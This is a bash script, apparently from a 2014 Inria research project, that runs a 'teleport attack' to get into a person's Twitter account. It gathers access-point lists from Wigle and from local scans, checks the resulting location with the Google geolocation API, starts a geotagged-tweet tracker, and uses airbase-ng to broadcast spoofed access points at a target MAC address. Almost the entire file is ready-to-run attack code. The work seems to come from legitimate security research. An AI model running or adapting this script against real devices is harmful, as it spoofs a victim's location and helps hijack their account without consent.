#!/bin/bash

# This script performs the full teleport attack to get someone's twitter account
# Written by Célestin Matte @ citi, Inria, 2014
# arg1 = latitude
# arg2 = longitude
# In order to use this script, you must have:
# - an interface wlan0

# @TODO : command line options for these parameters
# @TODO: separate precision for longitude and latitude
interface="wlan0";
interface_scan="wlan0";
precision=0.0005;
torify="";
# Enter your Google API key here
api_key="";
# Enter target MAC address here
target_mac="";

if [ "$#" -ne 2 ]
then
    echo "Usage : $0 <lat> <long>";
    exit;
fi

tmpfile=$(mktemp)
tmpfile2=$(mktemp)

trap "kill 0" EXIT

echo "Getting a list of APs close to the provided location from Wigle..."
$torify ./get_ssid_list.pl "$1" "$2" > $tmpfile
if [ $? -ne 0 ]
then
    exit;
fi
nb_aps=$(cat $tmpfile | wc -l)
echo "Got $nb_aps APs"
echo "Getting a list of currently visible APs..."
echo "We need to be root for this"
# Note : useless with mdk3
sudo ifconfig "$interface" down \
  && sudo iwconfig "$interface" mode managed \
  && sudo ifconfig "$interface" up
./get_current_ssid.pl "$interface_scan" >> $tmpfile
echo "Got " $(echo $(cat $tmpfile | wc -l) "-$nb_aps" | bc) "new APs."
sudo ifconfig "$interface" down \
  && sudo iwconfig "$interface" mode monitor \
  && sudo ifconfig "$interface" up
echo "Checking the precise location that we should get from Google API..."
./convert_to_google_api.pl $tmpfile > $tmpfile2
res=$(curl -d @$tmpfile2 -H "Content-Type: application/json" -i "https://www.googleapis.com/geolocation/v1/geolocate?key=$api_key" 2>/dev/null)

echo -n "Now, open another terminal and launch : php filter-track-geo.php "
lat=$(echo $res | sed -r 's/.*"lat": (-?[0-9\.]+).*/\1/')
long=$(echo $res | sed -r 's/.*"lng": (-?[0-9\.]+).*/\1/')
echo $(echo $lat-$precision | bc) $(echo $long-$precision | bc) $(echo $lat+$precision | bc) $(echo $long+$precision | bc)
echo "(Estimated coordinates: $lat $long, with precision $precision"

php filter-track-geo.php $(echo $lat-$precision | bc) $(echo $long-$precision | bc) $(echo $lat+$precision | bc) $(echo $long+$precision | bc) &

#echo -e "\nLaunching the attack with mdk3 and the list of AP."
echo -e "\nLaunching the attack with aircrack-ng and the list of AP."
echo "We need to be root for this"
#sudo mdk3 "$interface" b -v $tmpfile -g -t
sudo airbase-ng -m $tmpfile -p -X -d $target_mac wlan0